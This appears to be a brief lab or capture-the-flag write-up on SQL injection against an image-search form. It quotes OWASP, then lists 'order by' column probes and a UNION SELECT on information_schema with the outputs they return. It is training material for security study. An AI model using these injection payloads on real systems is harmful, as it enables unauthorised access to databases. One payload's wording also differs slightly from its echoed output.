# SQL injection

## vulnerability
> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.
> 
> see https://owasp.org/www-community/attacks/SQL_Injection

## exploit
Home -> SEARCH IMAGE

1. see the form behavior<br/>
input -> output<br/>
`1` ->
`ID: 1 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_`<br/>
`2` ->
`ID: 2 
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42`


2. error based SQL injection<br/>
input -> output<br/>
`1 order by 1--` ->
`ID: 1 order by 1-- 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_`<br/>
`1 order by 2--` ->
`ID: 1 order by 2-- 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_`<br/>
`1 order by 3--` -> ` ` (no output)<br/>
We can assume there are 2 columns extracted from table.


3. union based SQL injection<br/>
input -> output<br/>
`1 union select null, table_name information_schema.tables--`
->
`ID: 1 union select null, table_name from information_schema.tables-- 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
...
ID: 1 union select null, table_name from information_schema.tables-- 
Title: list_images
Url : `





## reference
* https://owasp.org/www-community/attacks/SQL_Injection

